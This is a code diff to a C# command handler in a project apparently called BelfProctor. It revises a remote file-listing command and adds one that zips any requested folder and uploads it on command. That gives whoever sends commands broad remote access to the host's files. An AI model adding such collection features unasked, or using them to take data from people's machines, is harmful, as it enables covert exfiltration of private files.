@@ -2,6 +2,7 @@ using System.Text;
 using Microsoft.Extensions.Options;
 using Newtonsoft.Json;
 using BelfProctor.Models;
+using System.IO.Compression;
 
 namespace BelfProctor.Services;
 
@@ -47,27 +48,52 @@ public class CommandHandler
             var includeDirs = GetBool(cmd.Payload, "includeDirs", true);
 
             var files = new List<object>();
-            var opt = new EnumerationOptions { RecurseSubdirectories = recursive, IgnoreInaccessible = true, AttributesToSkip = FileAttributes.System | FileAttributes.Temporary };
-            foreach (var path in Directory.EnumerateFiles(basePath, pattern, opt))
-            {
-                var info = new FileInfo(path);
-                files.Add(new { name = info.Name, size = info.Length, lastWriteTime = info.LastWriteTimeUtc, fullPath = info.FullName });
-                if (files.Count >= maxEntries) break;
-            }
+            var dirs = new List<object>();
 
-            List<object>? dirs = null;
-            if (includeDirs)
+            try 
             {
-                dirs = new List<object>();
-                foreach (var d in Directory.EnumerateDirectories(basePath, "*", opt))
+                var opt = new EnumerationOptions 
+                { 
+                    RecurseSubdirectories = recursive, 
+                    IgnoreInaccessible = true, 
+                    AttributesToSkip = FileAttributes.System | FileAttributes.Temporary,
+                    ReturnSpecialDirectories = false
+                };
+
+                // Use EnumerateFileSystemInfos for single-pass efficiency if possible, 
+                // but splitting is cleaner for the current API format. 
+                // To optimize memory, we strictly obey maxEntries.
+                
+                int count = 0;
+                
+                // Directories first? Or mixed? The API separates them.
+                // Let's do directories first if requested.
+                if (includeDirs)
                 {
-                    var di = new DirectoryInfo(d);
-                    dirs.Add(new { name = di.Name, lastWriteTime = di.LastWriteTimeUtc, fullPath = di.FullName });
-                    if (dirs.Count >= maxEntries) break;
+                    foreach (var d in Directory.EnumerateDirectories(basePath, "*", opt))
+                    {
+                        var di = new DirectoryInfo(d);
+                        dirs.Add(new { name = di.Name, lastWriteTime = di.LastWriteTimeUtc, fullPath = di.FullName });
+                        count++;
+                        if (dirs.Count >= maxEntries) break;
+                    }
+                }
+
+                // Files
+                // Only fetch files if we haven't hit a global limit? 
+                // The current UI separates them, but let's keep the per-list limit for now.
+                // But let's be careful not to iterate unnecessarily.
+                
+                foreach (var path in Directory.EnumerateFiles(basePath, pattern, opt))
+                {
+                    var info = new FileInfo(path);
+                    files.Add(new { name = info.Name, size = info.Length, lastWriteTime = info.LastWriteTimeUtc, fullPath = info.FullName });
+                    if (files.Count >= maxEntries) break;
                 }
             }
+            catch { }
 
-            var json = JsonConvert.SerializeObject(new { files, directories = dirs });
+            var json = JsonConvert.SerializeObject(new { files, directories = includeDirs ? dirs : null });
             var bytes = Encoding.UTF8.GetBytes(json);
             await _transmission.SendCommandResultJsonAsync(cmd.Id, bytes);
             return;
@@ -78,6 +104,24 @@ public class CommandHandler
             var path = Environment.ExpandEnvironmentVariables(GetString(cmd.Payload, "path", string.Empty));
             if (string.IsNullOrWhiteSpace(path) || !File.Exists(path)) return;
             await _transmission.SendCommandResultFileAsync(cmd.Id, path);
+            return;
+        }
+
+        if (cmd.Type == "folder")
+        {
+            var path = Environment.ExpandEnvironmentVariables(GetString(cmd.Payload, "path", string.Empty));
+            if (string.IsNullOrWhiteSpace(path) || !Directory.Exists(path)) return;
+            
+            var tempFile = Path.GetTempFileName() + ".zip";
+            try
+            {
+                ZipFile.CreateFromDirectory(path, tempFile);
+                await _transmission.SendCommandResultFileAsync(cmd.Id, tempFile);
+            }
+            finally
+            {
+                try { if (File.Exists(tempFile)) File.Delete(tempFile); } catch { }
+            }
             return;
         }
     }
